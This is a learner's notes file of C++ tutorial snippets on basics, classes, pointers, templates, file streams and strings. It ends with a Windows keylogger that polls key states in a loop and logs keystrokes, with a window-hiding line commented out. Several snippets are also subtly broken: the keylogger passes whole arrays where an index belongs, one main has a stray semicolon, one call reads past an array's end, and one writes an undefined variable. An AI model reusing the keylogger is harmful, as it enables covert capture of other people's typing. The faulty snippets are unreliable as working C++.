#include <iostream>

using namespace std;

int main()
{
	
    int a;
    int b;
    int sum;

    cout << "Enter a number:";
    cin >> a;

    cout << "Enter another number:";
    cin >> b;

    sum = a + b;
    cout << "\n\nthe sum of those numbers is " << sum << " Euros";

    return 0;
}









#include <iostream>     // a preprocessor directive

using namespace std;

int main()
{

    // Possible Mathematical Operations: this (Basic Arithmetic) and way more, Braces and logical stuff is being used as well

    int b = 4 + 8; // 12
    int x = 8 - 4; // 4
    int y = 7 * 3; // 21
    int z = 81 / 2; // 40, because i'ts an Integer
    int a = 81 % 2; // 1, because It's the remainder

    return 0;
}










    // relational and basical operators: <, >, <=, >=, ==, !=










#include <iostream>

using namespace std;

void printSomething();

int main()
{
    // simple function
    printSomething();
    return 0;
}

void printSomething(){
    cout << "This is text ont the screen" << endl;
}









#include <iostream>

using namespace std;

void printCrap(int);

int main()
{
    int x;
    cout << "What is your favourite number?\n";
    
    cin >>x;
    printCrap(x);
    return 0;
}

void printCrap(int x){
    cout << "Your favourite number is " << x;
}










#include <iostream>

using namespace std;

int addNumbers(int x, int y);

int main()
{
    int x;
    int y;
    cout << "This console application adds two numbers.\nPlease Enter two numbers seperated by return.\n";
    cin >> x;
    cin >> y;
    cout << "The result is " << addNumbers(x, y);
    return 0;
}

int addNumbers(int x, int y){
    return x + y;
}











#include <iostream>

using namespace std;

class MyClass{
    public:     // access specifier
    void coolSaying(){
        cout <<"preachin to the choir"<<endl;
    }
};

int main()
{
    MyClass MyObject;
    MyObject.coolSaying();
    return 0;
}









#include <iostream>
#include <string>

using namespace std;

class MyClass{
private:
    string name;
public:
    void setName(string x){
        name = x;
    }
    string getName(){
        return name;
    }
};

int main()
{
    MyClass MyObject;
    cout<<"What's your Name?\n";
    string name;
    cin>>name;
    MyObject.setName(name);
    name = "";
    cout<<"Your Name is "<<MyObject.getName();
    return 0;
}









#include <iostream>
#include <string>

using namespace std;

class MyClass{
private:
    string name;
public:
    MyClass(string z){
        setName(z);
    }
    void setName(string x){
        name = x;
    }
    string getName(){
        return name;
    }
};

int main()
{
    MyClass MyObject("This is the Name");
    cout<<MyObject.getName();
    return 0;
}










main.cpp
#include <iostream>
#include "Burrito.h"

using namespace std;

int main();
{
    Burrito bo;
    return 0;
}





Burrito.h
#ifndef BURRITO_H
#define BURRITO_H

class Burrito
{
    public:
        Burrito();
    // private:
    // protected:
};
#endif // BURRITO_H





Burrito.cpp
#include "Burrito.h"
#include <iostream>

Burrito::Burrito()
{
    cout << "I am a banana";
}












#include <iostream>

using namespace std;

int main()
{
    cout<<"Please Enter your age:"<<endl;
    int age;
    cin>>age;

    if(age>60){
        if(age>100){
            cout << "why are you still alive";
        }else{
            cout << "wow you are old";
        }
    }else{
        cout<<"you are young, get a job!";
    }

    // < > == <= >= != = Comparison Operators

    return 0;
}










#include <iostream>

using namespace std;

int main()
{
    int bacon = 1;

    while(bacon <= 20){
        cout<<"bacon is "<<bacon<<endl;
        bacon = bacon + 3;
    }
    return 0;
}











#include <iostream>

using namespace std;

int main()
{
    int x = 0;
    int y;
    int total = 0;
    cout << "Please enter Five numbers"<<endl;
    cout << "Press return after entering each number"<<endl;
    while(x < 5){
        cin>>y;
        total = total + y;
        x++;
    }
    cout<< "Total is "<<total<<endl;
    return 0;
}










#include <iostream>

using namespace std;

int calcaverage(int total, int howmuch);

int main()      // Sentinel Controlled loop
{
    int age;
    int agetotal = 0;
    int total = 0;

    cout << "Enter first persons age or -1 to quit"<<endl;
    cin>>age;

    while(age != -1){
        agetotal = agetotal + age;
        total++;
        cout << "Enter next age or -1 toquit"<<endl;
        cin>>age;
    }
    cout << "Number of people entered: " << total <<endl;
    cout << "Average age: " << agetotal/total;

    return 0;
}












#include <iostream>

using namespace std;

int main()
{

    int x = 10;

    x += 10;    // adds ten     -> 20
    x -=10;     // subtracts ten       -> 10
    x *= 5;     // multiplies x by 5    -> 50
    x /= 5;     // divides x by 5      -> 10
    x %= 5;     // returns the remainder of the division of x with 5    -> 0
    cout << x++ << endl;    // Assignment Operator - adds one after running the line - 10 - 11
    cout << ++x << endl;    // Assignment Operator - adds one before running the line - 11 - 11

    // return 0; is no longer required, because it is assumed if it is not actually there
}













#include <iostream>

using namespace std;

int main()
{

    for(int x = 0; x < 10; x++){
        cout<<x<<endl;
    }
    // for(initialization; loop continuation condition; increment){...}

}












#include <iostream>
#include <cmath>

using namespace std;

int main()
{

    float a;
    float p = 10000;
    float r = .01;

    for(int day = 1; day <= 30; day++){
        a = p * pow(1 + r, day);
        cout << day << " - " << a << endl;
    }

}












#include <iostream>

using namespace std;

int main()
{

    int x = 1;

    do{
        cout << x << endl;
        x++;
    }while(x<10);

}











#include <iostream>

using namespace std;

int main()
{

    int age = 0;

    cout << "Please enter your Age:"<<endl;
    cin>>age;

    switch(age){
        case 16:
            cout << "hey you can drive now!" << endl;
            break;
        case 18:
            cout << "go buy some lotto tickets~!" << endl;
            break;
        case 21:
            cout << "buy me some beer" << endl;
            break;
        default:
            cout << "sorry you get nothing" << endl;
    }

}










#include <iostream>

using namespace std;

int main()
{

    int age = 23;
    int money = 50;

    if( age >= 21 && money >= 500){
        cout << "you are allowed in anyways" << endl;
    } else if( age >= 21 || money >= 500){
        cout << "you are allowed in" << endl;
    }

}









#include <iostream>
#include <cstdlib>
#include <ctime>

using namespace std;

int main()
{

    srand(time(0));

    for(int x = 0; x<50; x++){
        cout << (rand() % 6)+1 << endl;
    }

}











#include <iostream>

using namespace std;

int volume(int l=1, int w=1, int h=1);

int main()
{
    cout << volume(5,6,7);
}



int volume(int l, int w, int h){
    return l*w*h;
}













#include <iostream>

using namespace std;

int bacon = 36;

int main()
{
    int bacon = 65;
    cout << bacon << endl;      // -> 65
    cout << ::bacon << endl;    // -> 36
    // :: = Unary Scope Resolution Operator
}










#include <iostream>

using namespace std;

void printNumber(int x){
    cout << "I am printing the Integer "<< x <<endl;
}

void printNumber(float x){
    cout << "I am printing a flaot "<<x<<endl;
}

int main()
{
    int a = 67;
    float b = 56.1769;

    printNumber(a);
    printNumber(b);
}









#include <iostream>

using namespace std;

int factoialFinder(int x){
    if(x== 1){
        return 1;
    } else{
        cout << "searching for " << x << " factorial ..." << endl;
        return x*factoialFinder(x-1);
    }
    // this is a recursive function (a function calling itself), 
    // and you ALWAYS need a return statement since it would be an infinite loop otherwise
}

int main()
{
    int x;
    cin >>x;
    cout << factoialFinder(x);
}











#include <iostream>

using namespace std;

int main()
{
    int bucky[5] = {1,2,3,4,5};     // {1465,1597, ...This is the Array initializer list... ,786,67};

    cout << bucky[3];       // -> 4
}













#include <iostream>

using namespace std;

int main()
{
    int bucky[9];

    cout << "Element - Value" << endl;

    for(int a = 0; a < 9; a++){
        bucky[a] = 99;
        cout<<"   " <<a<<"  ---  "<<bucky[a]<<endl;
    }
}











#include <iostream>

using namespace std;

int main()
{
    int tuna[5] = {20,54,76,832,546};
    int sum = 0;

    for(int a = 0; a < 5; a++){
        sum += tuna[a];
        cout << sum << endl;
    }
}











#include <iostream>

using namespace std;

void printArray(int Array[], int arraySize);

int main()
{
    int bucky[3] = {20,54,675};
    int jessica[7] = {45,24,68,23,16,87,46};

    printArray(bucky, 3);
    cout << endl<<endl;
    printArray(jessica, 30);
}

void printArray(int Array[], int arraySize){
    for(int a = 0; a < arraySize; a++){
        cout << Array[a] << endl;
    }
}










#include <iostream>

using namespace std;

int main()
{
    int sally[2][3] = {{2,3,4},{5,6,7}};

    // 2,3,4
    // 5,6,7

    cout << sally[1][2];
}










#include <iostream>

using namespace std;

int main()
{
    int sally[2][3] = {{1,2,3},{4,5,6}};

    for(int row=0;row<2;row++){
        for(int column=0;column<3;column++){
            cout << sally[row][column]<< " ";
        }
        cout << endl;
    }
}












#include <iostream>

using namespace std;

int main(){
    int fish = 5;
    cout << &fish << endl;      // returns the memory adress of the variable fish
                            // '&' is the Memory Adress Operator
    int *fishPointer;       // this is a different tpye of int wich can store memory adresses
                            // '*' is the sign for a Pointer
    fishPointer = &fish;
    cout << fishPointer<<endl;
}












#include <iostream>

using namespace std;

void passByValue(int x);
void passByReference(int *x);

int main(){
    int betty = 13;
    int sandy = 13;

    passByValue(betty);
    passByReference(&sandy);

    cout << "betty is now " << betty << endl;
    cout << "sandy is now " << sandy << endl;
}

void passByValue(int x){
    x=99;
}

void passByReference(int *x){
    *x=66;      // necessary because else we would change x not the value it refers to
}











#include <iostream>

using namespace std;

int main(){

    // double c;    // -> 8
    // int c;       // -> 4
    // string c;    // -> 8
    // char c;     // -> 1
    // float c;     // -> 4
    double bucky[10];      // -> 80
    cout << sizeof(bucky) << endl;

    cout <<sizeof(bucky)/sizeof(bucky[0]) <<endl;

}













#include <iostream>

using namespace std;

int main(){

    int bucky[5];
    int *bp0 = &bucky[0];
    int *bp1 = &bucky[1];
    int *bp2 = &bucky[2];
    int *bp3 = &bucky[3];
    int *bp4 = &bucky[4];
    cout << "bp0 is at " << bp0 << endl;
    cout << "bp1 is at " << bp1 << endl;
    cout << "bp2 is at " << bp2 << endl;
    cout << "bp3 is at " << bp3 << endl;
    cout << "bp4 is at " << bp4 << endl;

    bp0 +=2;

    cout << "bp0 is now at " << bp0 << endl;
    // it's not two numbers ahead, but pointing two objects farther
}












#include <iostream>

using namespace std;

int main(){

    int bucky[5];
    int *bp0 = &bucky[0];
    int *bp1 = &bucky[1];
    int *bp2 = &bucky[2];
    int *bp3 = &bucky[3];
    int *bp4 = &bucky[4];
    cout << "bp0 is at " << bp0 << endl;
    cout << "bp1 is at " << bp1 << endl;
    cout << "bp2 is at " << bp2 << endl;
    cout << "bp3 is at " << bp3 << endl;
    cout << "bp4 is at " << bp4 << endl;

    bp0 +=2;

    cout << "bp0 is now at " << bp0 << endl;
    // it's not two numbers ahead, but pointing two objects farther
}










#include <iostream>
#include "Sally.h"

using namespace std;

int main()
{

    Sally SallyO;
    Sally *sallyPointer = &SallyO;

    SallyO.printCrap();
    sallyPointer->printCrap();

}









#include "Sally.h"
#include <iostream>

using namespace std;

Sally::Sally()
{
    cout << "I am the constructor"<<endl;
}

Sally::~Sally(){
    cout << "I am the deconstructor" << endl;
}









#include "Sally.h"
#include <iostream>

using namespace std;

Sally::Sally(){}

void Sally::printShiz(){
    cout << "This is a regular function" << endl;
}

void Sally::printShiz2() const {
    cout << "This is a constant function" << endl;
}




#ifndef SALLY_H
#define SALLY_H
class Sally
{
    public:
        Sally();
        void printShiz();
        void printShiz2() const;
};
#endif // SALLY_H












#include "Sally.h"
#include <iostream>

using namespace std;

Sally::Sally(int a, int b)
: regVar(a), constVar(b)        // Member Initializer list, useful for constant values
{
}

void Sally::print(){
    cout << "regular var is: " <<regVar<<endl;
    cout << "const var is: " <<constVar<<endl;
}



#ifndef SALLY_H
#define SALLY_H
class Sally {
    public:
        Sally(int a, int b);
        void print();
    private:
        int regVar;
        const int constVar;
};
#endif // SALLY_H











// Composition, having another class as a field or a member, 
// a variable of another class

#include <iostream>
#include <string>
#include "People.h"
#include "Birthday.h"
using namespace std;
void stupidfunction();

int main()
{

    Birthday birthObject(12,28,1986);

    string name = "Bucky Roberts";

    People buckyRoberts(name, birthObject);

    buckyRoberts.printInfo();

}





#include "Birthday.h"
#include <iostream>
using namespace std;
Birthday::Birthday(int m, int d, int y)
{
    month = m;
    day = d;
    year = y;
}


void Birthday::printDate(){
    cout << month << "/" << day << "/" << year << endl;
}





#include "People.h"
#include "Birthday.h"
#include <string>
#include <iostream>
using namespace std;
People::People(string x, Birthday bo)
: name(x), dateOfBirth(bo)
{
}


void People::printInfo(){
    cout << name << " was born on ";
    dateOfBirth.printDate();
}














// Friends

#include <iostream>

using namespace std;

class StankFist{
    public:
        StankFist(){stinkyVar=0;}
    private:
        int stinkyVar;

    friend void stinkysFriend(StankFist &sfo);
};

void stinkysFriend(StankFist &sfo){
    sfo.stinkyVar=99;
    cout << sfo.stinkyVar << endl;
}


int main()
{
    StankFist bob;
    // bob.stinkyVar = 99;      // because stinkyVar is private!
    // cout << bob.stinkyVar <<endl;
    stinkysFriend(bob);
}

















#include <iostream>
#include "Hannah.h"

using namespace std;

Hannah::Hannah(int num)
:h(num)
{
}


void Hannah::printCrap(){
    cout << "h=" << h << endl;      // print out h from this object
    cout << "this->" << this->h << endl;        // print out h from this object
    cout << "(*this).h=" << (*this).h<< endl;       // print out h from the object on *this adress
}

















// Operator Overloading

#include <iostream>
#include "Hannah.h"
using namespace std;

int main() {
    Hannah a(34);
    Hannah b(21);
    Hannah c;

    c=a+b;      // c = brandNew
    cout << c.num << endl;
}




#ifndef HANNAH_H
#define HANNAH_H
class Hannah
{
    public:
        int num;
        Hannah();
        Hannah(int h);
        Hannah operator+(Hannah);
};
#endif // HANNAH_H



#include <iostream>
#include "Hannah.h"
using namespace std;

Hannah::Hannah(){}

Hannah::Hannah(int h) {
    num = h;
}

Hannah Hannah::operator+(Hannah aho){
    Hannah brandNew;
    brandNew.num = num + aho.num;
    return (brandNew);
}









// inheriting: base class to derived class

#include <iostream>
#include "Mother.h"
#include "Daughter.h"
using namespace std;

int main(){
    Mother mom;
    mom.sayName();

    Daughter tina;
    tina.sayName();
}



#include <iostream>
#include "Mother.h"
#include "Daughter.h"
using namespace std;

Mother::Mother(){}

void Mother::sayName(){
    cout << "I am a Roberts" << endl;
}




#ifndef DAUGHTER_H
#define DAUGHTER_H

class Daughter: public Mother
{
    public:
        Daughter();
    protected:
    private:
};

#endif // DAUGHTER_H




#include <iostream>
#include "Mother.h"
#include "Daughter.h"
using namespace std;

Daughter::Daughter(){}











// you can't access neither protected nor private variables from 
// another class. Yet protected can be inherited, while private cannot
private:
    int privatevar; // you cannot access the private variable from 
    // an derived class since it is not being inherited











#include <iostream>
#include "Mother.h"
#include "Daughter.h"
using namespace std;
int main(){
    Daughter tina;
}



#include <iostream>
#include "Mother.h"
#include "Daughter.h"
using namespace std;

Mother::Mother(){
    cout << "I am the mother constructor" << endl;
}

Mother::~Mother(){
    cout << "I am the mother deconstructor" << endl;
}





#include <iostream>
#include "Mother.h"
#include "Daughter.h"
using namespace std;

Daughter::Daughter(){
    cout << "I am a Daughter constructor"<< endl;;
}

Daughter::~Daughter(){
    cout << "I am a Daughter deconstructor"<< endl;;
}



Output:
ma constructor,
Daughter constructor,
Daughter deconstructor,
ma deconstructor














// this is not yet polymorphism

#include <iostream>

using namespace std;

class Enemy{
    protected:
        int attackPower;
    public:
        void setAttackPower(int a){
            attackPower=a;
        }
};

class Ninja: public Enemy{
    public:
        void attack()
        {cout << "I am a ninja, ninja chop! -" << attackPower << endl;}
};

class Monster: public Enemy{
    public:
        void attack()
        {cout << "monster must eat you!!!! -" << attackPower << endl;}
};

int main(){
    Ninja n;
    Monster m;
    Enemy *enemy1 = &n;     // because ninja is of type enemy, this is valid
    Enemy *enemy2 = &m;     // anything that an enemy can do, monsters can do
    enemy1->setAttackPower(29); // ninja is just a more specific type of enemy
    enemy2->setAttackPower(99); // every enemy has setAttackPower
    n.attack();         // can't use enemy1 because it's type Enemy
    m.attack();         // Enemy class does not have attack
}














// this is polymorphism

#include <iostream>

using namespace std;

class Enemy{
    public:
        virtual void attack(){} // virtual=> so that it is polymorphic
            // means being overwritten by the specific attack function
            // this is called a Template
};

class Ninja: public Enemy{
    public:
        void attack(){
            cout << "ninja attack!" << endl;
        }
};

class Monster: public Enemy{
    public:
        void attack(){
            cout << "monster attack!" << endl;
        }
};

int main(){
    Ninja n;
    Monster m;
    Enemy *enemy1 = &n;
    Enemy *enemy2 = &m;
    enemy1->attack();
    enemy2->attack();
}













#include <iostream>

using namespace std;

class Enemy{        // this is an abstract class, since it only has pure virtual classes
    public:
        virtual void attack()=0;    // this is a pure virtual function, it must be overridden by everyone inheriting it
};

class Ninja: public Enemy{
    public:
        void attack(){
            cout << "ninja attack!" << endl;
        }
};

class Monster: public Enemy{
    public:
        void attack(){
            cout << "monster attack!" << endl;
        }
};

int main(){
    Ninja n;
    Monster m;
    Enemy *enemy1 = &n;
    Enemy *enemy2 = &m;
    enemy1->attack();
    enemy2->attack();
}
















#include <iostream>

using namespace std;

template<class bucky>       // this is a function template, it is just like a generic value, like var in C#

bucky addCrap(bucky a, bucky b){ // since the return value is set
    return a+b;     // when the first value is set, it's way easier
}

int main(){
    double x=7.389, y=32.435, z;
    // int x = 23, y = 45, z;
    z = addCrap(x, y);
    cout << z <<endl;
}














#include <iostream>

using namespace std;

template <class FIRST, class SECOND>        // this is a function template with multiple parameters

FIRST smaller(FIRST a, SECOND b){       // return type THIRD won't work for some reason
    return (a<b?a:b);
}

int main(){
    int x = 39;
    double y = 38.38;
    cout << smaller(x,y) << endl;
}











#include <iostream>

using namespace std;

// a template is just a generic data type
template <class T>
class Bucky{
    T first, second;
    public:
        Bucky(T a, T b){
            first=a;
            second=b;
        }
        T bigger();
};

template <class T>      // you need that again in front of every new function, class, whatever
T Bucky<T>::bigger(){       // you need to include the function template again ( the function template parameter, here T)
    return (first>second?first:second);     // (if(first>second){return first;}else{return second;})
}

int main(){
    Bucky <int> bo(68, 586);    // it NEEDS the data type
    cout << bo.bigger();
}

















#include <iostream>
#include <string>

using namespace std;

template <class T>      // everything except the char data type is being worked through with this class
class Spunky{
    public:
        Spunky(T x){
            cout << x << " is not a character!"<<endl;
        }
};

template<>      //this is Template Specialization
class Spunky<char> {    // it HAS to be the same class name as the other one before
    public:
        Spunky(char x){
            cout << x << " is indeed a character!"<< endl;
        }
};

template<>
class Spunky<string> {
    public:
        Spunky(string x){
            cout << x << " is indeed a string!" << endl;
        }
};

int main(){
    Spunky<int> obj1(7);        // => Not
    Spunky<double> obj2(3.684);     // => Not
    Spunky<string> obj3("Hi :D");       // => string!
    Spunky<char> obj4('q');     // => is!
}












#include <iostream>

using namespace std;

int main(){
    try{
        int momsAge = 50;
        int sonsAge = 34;

        if(sonsAge>momsAge){
            throw 99;
        }
    } catch(int x){
        cout << "son can not be older than mom, ERROR NUMBER: " << x << endl;
    }
}











#include <iostream>

using namespace std;

int main(){

    try{

        int num1;
        cout <<
        "Enter first number: ";
        cin >> num1;

        int num2;
        cout << "Enter second number: ";
        cin >> num2;

        if(num2==0){
            throw 0;
        }
        cout << num1/num2 << endl;

    }catch(...){       // any Error message is being cought
        cout << "you cant divide by zero";
    }

}










#include <iostream>
#include <fstream>

using namespace std;

int main(){

    ofstream fileObject;
    fileObject.open("tuna.txt");
    // this opens the tuna.txt if it exists, and creates one and associates with it if not

    fileObject << "I love tuna and tuna loves me!\nEND";
    fileObject.close();     // this closes the ofstream fileObject and frees it's used memory, useful since we don't need it anymore

}











#include <iostream>
#include <fstream>
#include <string>

using namespace std;

int main(){

    ofstream fileObject("beefjerky.txt");

    if(fileObject.is_open()){
        cout << "ok the file is open" << endl;
        fileObject << text << "I love the beef!\n";
        fileObject.close();
    } else {
        cout << "bucky you messed up" << endl;
    }

}








#include <iostream>
#include <fstream>
#include <string>

using namespace std;

int main(){

    ofstream theFile("players.txt");

    cout << "Enter players ID, Name, ad Money" << endl;
    cout << "press Ctrl+Z to quit\n" << endl;
    /*
    * This doesn't work for some reason
    * you have to type 'exit' and hit enter for it to close
    * I have no Idea why it is like this, but it is 
    */ 

    int idNumber;
    string name;
    double money;

    while(cin >> idNumber >> name >> money){
        theFile << idNumber << ' ' << name << ' ' << money << endl;
    }
    /*
    * something to that, you enter it like '1 sophie 385.49'
    * and for some reason, it makes a new file when running this program
    * again
    */
}










#include <iostream>
#include <fstream>
#include <string>

using namespace std;

int main(){

    // ofstream is for writing, while ifstream is for reading
    ifstream theFile("players.txt");

    int id;
    string name;
    double money;

    while(theFile >> id >> name >> money){      // when the loop ends the ifstream is automatically getting destroyed
        cout << id << " " << name << " " << money << endl;
    }

}











#include <iostream>
#include <fstream>
#include <string>

using namespace std;

int getWhatTheyWant();
void displayItems(int x);

// main function
int main(){

    int whatTheyWant;
    // whatTheyWant = getWhatTheyWant();    // not necessary, this way even more useful since the possibilities are being shown

    while(whatTheyWant != 4 || whatTheyWant == NULL){
        displayItems(whatTheyWant);
        whatTheyWant = getWhatTheyWant();
    }

}

// getWhatTheyWant function
int getWhatTheyWant(){
    int choice;

    cout<< endl << "what do you want?" << endl;
    cout << "1 - just plain items" << endl;
    cout << "2 - helpful items" << endl;
    cout << "3 - harmful items" << endl;
    cout << "4 - quit program\n" << endl;

    cin>>choice;
    return choice;
}

// display items function
void displayItems(int x){

    ifstream objectsFile("objects.txt");
    string name;
    double power;

    while(objectsFile >> name >> power){
        if(x==1 && power==0){
            cout << name << ' ' << power << endl;
        }

        if(x==2 && power > 0){
            cout << name << ' ' << power << endl;
        }

        if(x==3 && power < 0){
            cout << name << ' ' << power << endl;
        }
    }

}












#include <iostream>

using namespace std;

int main(){

    string x;

    getline(cin, x);    // gets the whole input line, not like cin which ends after the first whitespace ' '
    
    cout << x << endl;

}









#include <iostream>

using namespace std;

int main(){

    string s1("hampster "); // == string s1 = "hampster ";
    string s2;      // blank string
    string s3;

    s2 = s1;
    s3.assign(s1);
    // these two did the exact same thing

    cout << s1 << s2 << s3 << endl;

}












#include <iostream>
#include <string>

using namespace std;

int main(){

    string s1 = "omgwtfbbq";
    cout << s1.at(3) << endl;   // Strings ARE Arrays of Characters

    for(int x=0;x<s1.length();x++){     // string.LENGTH()!!!
        cout << s1.at(x);       // == cout << s1;
    }

}












#include <iostream>
#include <string>

using namespace std;

int main(){

    string s1("OMG I think I am preggy!!");
    cout << s1.substr(17,7) << endl;     // SUBSTRING: string.substr(int begin, int far)+begin=end;

}












#include <iostream>
#include <string>

using namespace std;

int main(){

    string one("apples ");
    string two("beans ");

    cout << one << two << endl;
    one.swap(two);              //SWAPS two strings
    cout << one << two << endl;

}












#include <iostream>
#include <string>

using namespace std;

int main(){

    string s1("ham is spam oh yes I am!");

    cout << s1.find("am") << endl;      // => 1 == position of the first "am" found
    cout << s1.rfind("am") << endl;     // => 21 == position of the last "am" found
    cout << s1.find("am", 5) << endl;   // => 9 == position of the first "am" found after position 5

}












#include <iostream>
#include <string>

using namespace std;

int main(){

    string s1("Hi my name is bucky and I love bacon and ham!");

    cout << s1 << endl;
    s1.erase(30);       // ERASE everything from the 30th character to the end
    cout << s1 << endl;
    s1.replace(14, 5, "samuel jackson");    // replaces the string from the 14th to 5 characters after that with "samuel jackson"
    cout << s1 << endl;
    s1.insert(14, "lucky ");        // inserts "lucky " at the 14th character
    cout << s1 << endl;

}












// Other useful C++ things:

exit(0); // ends the program directly after this statement

// The levels of comments: what, how, and why

// I don't know in which context this stands, but:

#define MIN(a,b) (((a) < (b)) ? (a):(b))

...

int x=5, y=10, z;

z = MIN(x, y);      // this sets z to 5

// well yeah, basically is it a function declared on preprocessor basis?
// thats it, and It's called a macro, and variables can be predefined there
// as well!






#ifdef LOGGING_ENABLED  // #ifndef
cout << "Logging is enabled" << endl;
#else
cout << "Logging is disabled" << endl;
#endif






#if (LOGGING_LEVEL == LOGGING_MIN && \LOGGING_FLAG)
cout << "Logging is minimal" << endl;
#elif (LOGGING_LEVEL==LOGGING_MAX && \LOGGING_FLAG)
cout << "Logging is maximum" << endl;
#elif LOGGING_FLAG
cout << "Logging is standard" << endl;
#endif




bool flag;      //  true or false
...
if(flag)
{
    // Do something if the flag was true
}



// signed char == negative and positive numbers
// unsigned char == only positive numbers, but double the size
char newchar = 'a';     // usual char

#include <cwchar>
wchar_t newwchar = L'a';
// "Bigger" char





// you actually can use constructs like 'long d = 0xffffL;'
// hexadecimal numbers are signed with an 0x in front of them, 
// octal numbers ALWAYS have three digits and yeah, thats it.



// <cfloat> float: 3.45F, double: 3.45, long double, long: 3.45L


// pointers can be declared with void as well


// Enumerations are to be kept at preprocessor level:
enum SpectrumColor
{
    Red, Orange, Yellow, Green, Blue, Indigo, Violet
};

...

for(SpectrumColor s = Red; s <= Violet; s++)
{
    // Longest wavelenth to shortest
}



// another exampel for the numbers:
enum
{
    ASCII_NUL, // 0
    ASCII_SOH, // 1
    ASCII_STX, // 2

    ASCII_A = 65, // 65
    ASCII_B,    // 66

    BufferSize = 8  // 8
};

char buffer[BufferSize];




char name[] = "Margot";
wchar_t wide[] = L"Margot";




// Either of these is correct, but only in prototyping
// Do not forget the semicolon on the end, since these are statements.
int DoMath(int first, int second, int third, int fourth);
int DoMath(int, int, int, int);




// a function in another file is possible even without a header file!!
// just prototype it and it works all fine!




/* 
When programming: 
Following steps BEFORE writing code:
1. Define the problem
2. Define your targets
 - Understanding who your target user is
 - Defining what target architecture and/or OS your program will run on
 - Determining what set of tools you will be using
 - Determining whether you will write your program alone or as part of a team
 - Collecting requirements (a documented list of what the program should do) 
3. Make a heirarchy of tasks
*/



// a random number between 0.0 and 1.0? Here:
double rd = std::generate_canonical<double,
    std::numeric_limits<float>::digits>(rng);
float rf = rd;
if (rf > rd) {
  rf = std::nextafter(rf, -std::numeric_limits<float>::infinity());
}









// C++ Keylogger:
#define _WIN32_WINNT 0x0500
#include <windows.h>
#include <iostream>
#include <string>

using namespace std;

string log;
const void addLog(string v){
    log=log+v;
    cout<<log<<endl;
}

int main(){
    HWND hWnd = GetConsoleWindow();
    //ShowWindow(hWnd, SW_HIDE );

    bool isShift=false;
    bool isAlt=false;

    const int abcKeycodes[]={0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4A,0x4B,0x4C,0x4D,0x4E,0x4F,0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5A};
    const string abcKeyvaluesLower[]={"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"};
    const string abcKeyvaluesUpper[]={"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"};
    const string abcKeyvaluesAlt[]=  {"","","","","?","","","","","","",""," ","","","","@","","","","","","","","","","","","","","","","","","",};

    const int numKeycodes[]={0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69};
    const string numKeyvalues[]=     {"0","1","2","3","4","5","6","7","8","9","0","1","2","3","4","5","6","7","8","9"};
    const string numKeyvaluesUpper[]={"=","!","\""," ","$","%","&","/","(",")","","","","","","","","","","","","","","","","",""};
    const string numKeyvaluesAlt[]=  {"}",""," "," ","","","","{","[","]","","","","","","","","","","","","","","","","","","","",""};

    const int speKeycodes[]={0x08,0x09,0x0D,0x1B,0x20,0x25,0x26,0x27,0x28,0x6A,0x6B,0x6C,0x6D,0x6E,0x6F};
    const string speKeyvalues[]={"[BACK]","[TAB]","[ENTER]","[ESC]","[SPACEBAR]","[LEFTARROW]","[UPARROW]","[RIGHTARROW]","[DOWNARROW]","[MULTIPLY]","[ADD]","[SEPARATOR]","[SUBTRACT]","[DECIMAL]","[DIVIDE]"};

    while(true){
        if(GetKeyState(0xA0)<0  || GetKeyState(0xA1)<0){
            isShift=true;
        }else{
            isShift=false;
        }
        if(GetKeyState(0xA4)<0  || GetKeyState(0xA5)<0){
            isAlt=true;
        }else{
            isAlt=false;
        }


        for(int i=0;i<(sizeof(abcKeycodes)/sizeof(int));i++){
            if(GetKeyState(abcKeycodes)<0){
                if(isShift){
                    addLog(abcKeyvaluesUpper);
                }else if(isAlt){
                    addLog(abcKeyvaluesAlt);
                }else{
                    addLog(abcKeyvaluesLower);
                }
            }
        }

        for(int i=0;i<(sizeof(numKeycodes)/sizeof(int));i++){
            if(GetKeyState(numKeycodes)<0){
                if(isShift){
                    addLog(numKeyvaluesUpper);
                }else if(isAlt){
                    addLog(numKeyvaluesAlt);
                }else{
                    addLog(numKeyvalues);
                }
            }
        }

        for(int i=0;i<(sizeof(speKeycodes)/sizeof(int));i++){
            if(GetKeyState(speKeycodes)<0){
                addLog(speKeyvalues);
            }
        }
        Sleep(100);
    }
    return 0;
}










template